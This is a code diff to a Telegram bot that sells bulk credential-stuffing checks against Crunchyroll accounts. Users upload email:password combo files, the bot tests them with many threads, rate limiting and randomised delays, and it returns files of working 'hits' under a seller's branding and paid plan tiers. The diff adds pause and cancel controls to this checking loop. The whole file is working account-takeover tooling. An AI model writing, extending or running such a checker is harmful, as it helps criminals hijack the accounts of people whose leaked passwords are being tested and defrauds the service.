@@ -10,6 +10,8 @@ import requests
 import re
 import random
 import threading
+from threading import Event
+import threading
 import concurrent.futures
 from datetime import datetime, date
 import asyncio
@@ -1772,7 +1774,7 @@ async def handle_document(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     
     # ==================== BLOCK BULK UPLOAD FOR FREE PLAN ====================
-    stats = get_user_stats(user_id)        # ← pass user_id
+    stats = get_user_stats(user_id)
     limits = get_plan_limits(stats)
 
     if limits["display_name"] == "FREE":
@@ -1788,7 +1790,7 @@ async def handle_document(update: Update, context: CallbackContext):
     # Paid users (BASIC+) continue with normal file limit check
     max_files = limits.get("multi_scan_max_files", 1)
 
-    reset_daily_if_needed(stats, user_id)  # ← pass user_id
+    reset_daily_if_needed(stats, user_id)
     stats = get_user_stats(user_id)
 
     if stats.get("today_files", 0) >= max_files:
@@ -1800,7 +1802,7 @@ async def handle_document(update: Update, context: CallbackContext):
         )
         return
 
-    # Increment counters (only paid users reach here)
+    # Increment counters
     update_user_stats(user_id, {"today_files": stats.get("today_files", 0) + 1})
     update_user_stats(user_id, {"total_combo_files": stats.get("total_combo_files", 0) + 1})
 
@@ -1836,6 +1838,40 @@ async def handle_document(update: Update, context: CallbackContext):
             )
             return
 
+    # ====================== PAUSE / CANCEL CONTROL ======================
+    cancel_event = Event()
+    pause_event = Event()
+    pause_event.set()                    # Start unpaused
+
+    scan_id = str(uuid.uuid4())[:8]
+    context.user_data['current_scan'] = {
+        'scan_id': scan_id,
+        'cancel_event': cancel_event,
+        'pause_event': pause_event,
+        'progress_msg': None
+    }
+
+    # Control buttons
+    keyboard = [
+        [
+            InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
+            InlineKeyboardButton("⏹️ Cancel", callback_data=f"cancel_scan:{scan_id}")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Start message with buttons
+    progress_msg = await update.message.reply_text(
+        f"🚀 **Bulk Check Started**\n"
+        f"📁 <code>{document.file_name}</code>\n"
+        f"🔢 <b>0/{total}</b> accounts\n"
+        f"🧵 Threads: <b>{limits['current_threads']}</b>\n"
+        f"📡 Mode: <b>{get_mode_display(stats.get('api_mode'))}</b>",
+        parse_mode='HTML',
+        reply_markup=reply_markup
+    )
+    context.user_data['current_scan']['progress_msg'] = progress_msg
+
     # ====================== Start scanning ======================
     hits = []
     start_time = time.time()
@@ -1852,63 +1888,78 @@ async def handle_document(update: Update, context: CallbackContext):
         max_rps = 32
     rate_limiter = RateLimiter(max_rps=max_rps)
 
-    progress_msg = await update.message.reply_text(
-        f"🚀 Starting bulk check with <b>{user_threads}</b> threads...\n"
-        f"Mode: <b>{get_mode_display(stats.get('api_mode'))}</b>\n"
-        f"0/{total} completed (0%)", 
-        parse_mode='HTML'
-    )
-
     def check_account(acc):
+        """Worker that respects pause & cancel"""
+        if cancel_event.is_set():
+            return None
+
+        # Wait while paused
+        while not pause_event.is_set():
+            time.sleep(0.3)
+            if cancel_event.is_set():
+                return None
+
         email, pwd = acc
         rate_limiter.acquire()
-        # Use correct checker based on user's selected mode
+
         mode = stats.get("api_mode", "Crunchyroll")
         checker = get_checker_function(mode, user_id)
         result = checker(email, pwd)
+
         time.sleep(0.8 + random.uniform(0.6, 1.2))
         return result
-    
+
     completed = 0
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=user_threads) as executor:
         future_to_acc = {executor.submit(check_account, acc): acc for acc in accounts}
         
         for future in concurrent.futures.as_completed(future_to_acc):
+            if cancel_event.is_set():
+                break
+
             result = future.result()
             completed += 1
             
-            if result['success']:
+            if result and result.get('success'):
                 hits.append(result)
             
+            # Update progress every 5 accounts or at the end
             if completed % 5 == 0 or completed == total:
                 try:
                     percent = int((completed / total) * 100)
+                    status = "⏸️ **PAUSED**" if not pause_event.is_set() else "🚀 Checking"
                     await progress_msg.edit_text(
-                        f"🚀 Checking with {user_threads} threads...\n"
-                        f"{completed}/{total} completed ({percent}%)",
-                        parse_mode='HTML'
+                        f"{status}\n"
+                        f"📁 <code>{document.file_name}</code>\n"
+                        f"🔢 <b>{completed}/{total}</b> ({percent}%)\n"
+                        f"✅ Hits so far: <b>{len(hits)}</b>",
+                        parse_mode='HTML',
+                        reply_markup=reply_markup
                     )
                 except:
-                    pass
+                    pass  # message might be deleted or too fast
 
-    # ====================== UPDATE STATS ======================
-    hits_count = len(hits)
-    bad_count = total - hits_count
-    current_stats = get_user_stats(user_id)
+    # ====================== CLEANUP & FINISH ======================
+    if cancel_event.is_set():
+        await progress_msg.edit_text("⏹️ **Scan Cancelled** by user.", parse_mode='HTML')
+    else:
+        # Your original finish logic
+        hits_count = len(hits)
+        bad_count = total - hits_count
+        current_stats = get_user_stats(user_id)
 
-    update_user_stats(user_id, {
-        "total_scans": current_stats["total_scans"] + total,
-        "total_hits": current_stats["total_hits"] + hits_count,
-        "total_free": current_stats.get("total_free", 0) + bad_count,
-        "today_scans": current_stats["today_scans"] + total
-    })
+        update_user_stats(user_id, {
+            "total_scans": current_stats["total_scans"] + total,
+            "total_hits": current_stats["total_hits"] + hits_count,
+            "total_free": current_stats.get("total_free", 0) + bad_count,
+            "today_scans": current_stats["today_scans"] + total
+        })
 
-    # ====================== SUMMARY + HITS/BAD FILES (rest of your original code) ======================
-    elapsed = int(time.time() - start_time)
-    cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
-    
-    summary = f"""
+        elapsed = int(time.time() - start_time)
+        cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
+        
+        summary = f"""
 <b>📊 Scan Completed ✅</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━
 📁 <b>File:</b> <code>{document.file_name}</code>
@@ -1923,68 +1974,69 @@ async def handle_document(update: Update, context: CallbackContext):
 ⚡ <b>CPM:</b> <code>{cpm}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """
-    await progress_msg.edit_text(summary, parse_mode='HTML')
-    await manage_result_pin(update, context, progress_msg.message_id)
+        await progress_msg.edit_text(summary, parse_mode='HTML')
+        await manage_result_pin(update, context, progress_msg.message_id)
 
-    # ====================== HITS + BAD FILES ======================
-    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    
-# ====================== FULL CAPTION HITS FILE (Tiered) ======================
-    if hits_count > 0:
-        # Get user's plan for tiered formatting
-        current_stats = get_user_stats(user_id)
-        user_plan = current_stats.get("plan", "FREE").upper()
-        mode = stats.get("api_mode", "Crunchyroll")
-
-        hits_text = f"🎉 {mode.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
+        # ====================== HITS + BAD FILES (your original code) ======================
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         
-        for hit in hits:
-            hits_text += format_hit_for_file(hit, user_plan, mode)
+        if hits_count > 0:
+            current_stats = get_user_stats(user_id)
+            user_plan = current_stats.get("plan", "FREE").upper()
+            mode = stats.get("api_mode", "Crunchyroll")
 
-        hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
-        with open(hits_file, "w", encoding="utf-8") as f:
-            f.write(hits_text)
+            hits_text = f"🎉 {mode.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
+            for hit in hits:
+                hits_text += format_hit_for_file(hit, user_plan, mode)
 
-        fancy_caption = f"""
+            hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
+            with open(hits_file, "w", encoding="utf-8") as f:
+                f.write(hits_text)
+
+            fancy_caption = f"""
 👍 <b>{hits_count}x Crunchyroll Hits</b>
 ────────────────────────
 ☰ BY @caydigitals ✅
 ────────────────────────
 <a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
-        """.strip()
+            """.strip()
 
-        await update.message.reply_document(
-            document=open(hits_file, "rb"),
-            filename=f"Crunchyroll Hits @caydigitals.txt",
-            caption=fancy_caption,
-            parse_mode='HTML'
-        )
+            await update.message.reply_document(
+                document=open(hits_file, "rb"),
+                filename=f"Crunchyroll Hits @caydigitals.txt",
+                caption=fancy_caption,
+                parse_mode='HTML'
+            )
 
-    if bad_count > 0:
-        bad_text = "EMAIL:PASSWORD | STATUS\n" + "="*40 + "\n"
-        hit_emails = {hit['email'] for hit in hits}
-        for email, pwd in accounts:
-            status = "HIT" if email in hit_emails else "BAD"
-            bad_text += f"{email}:{pwd} | {status}\n"
-        
-        bad_file = f"/tmp/crunchy_bad_{timestamp}.txt"
-        with open(bad_file, "w", encoding="utf-8") as f:
-            f.write(bad_text)
-        
-        bad_caption = f"""
+        if bad_count > 0:
+            bad_text = "EMAIL:PASSWORD | STATUS\n" + "="*40 + "\n"
+            hit_emails = {hit['email'] for hit in hits}
+            for email, pwd in accounts:
+                status = "HIT" if email in hit_emails else "BAD"
+                bad_text += f"{email}:{pwd} | {status}\n"
+            
+            bad_file = f"/tmp/crunchy_bad_{timestamp}.txt"
+            with open(bad_file, "w", encoding="utf-8") as f:
+                f.write(bad_text)
+            
+            bad_caption = f"""
 ❌ <b>{bad_count}x Bad Accounts</b>
 ────────────────────────────
 ☰ BY @caydigitals ✅
 ────────────────────────────
 <a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
-        """.strip()
+            """.strip()
 
-        await update.message.reply_document(
-            document=open(bad_file, "rb"),
-            filename=f"Crunchyroll Bad @caydigitals.txt",
-            caption=bad_caption,
-            parse_mode='HTML'
-        )
+            await update.message.reply_document(
+                document=open(bad_file, "rb"),
+                filename=f"Crunchyroll Bad @caydigitals.txt",
+                caption=bad_caption,
+                parse_mode='HTML'
+            )
+
+    # Cleanup
+    if 'current_scan' in context.user_data:
+        del context.user_data['current_scan']
 
 async def edit_to_main_menu(update_or_query, context):
     context.user_data['in_main_menu'] = True
@@ -2129,6 +2181,27 @@ async def button_callback(update: Update, context: CallbackContext):
     elif data == "set_api_mode":
         context.user_data['in_main_menu'] = False
         await show_api_mode_menu(query, context)
+
+    elif data.startswith("pause_scan:"):
+        scan_id = data.split(":", 1)[1]
+        current = context.user_data.get('current_scan')
+        if current and current.get('scan_id') == scan_id:
+            pause_event = current['pause_event']
+            if pause_event.is_set():
+                pause_event.clear()
+                await query.answer("⏸️ Scan Paused", show_alert=True)
+            else:
+                pause_event.set()
+                await query.answer("▶️ Scan Resumed", show_alert=True)
+        return
+
+    elif data.startswith("cancel_scan:"):
+        scan_id = data.split(":", 1)[1]
+        current = context.user_data.get('current_scan')
+        if current and current.get('scan_id') == scan_id:
+            current['cancel_event'].set()
+            await query.answer("⏹️ Cancelling scan...", show_alert=True)
+        return
 
     elif data.startswith("set_mode:"):
         new_mode = data.split(":", 1)[1]
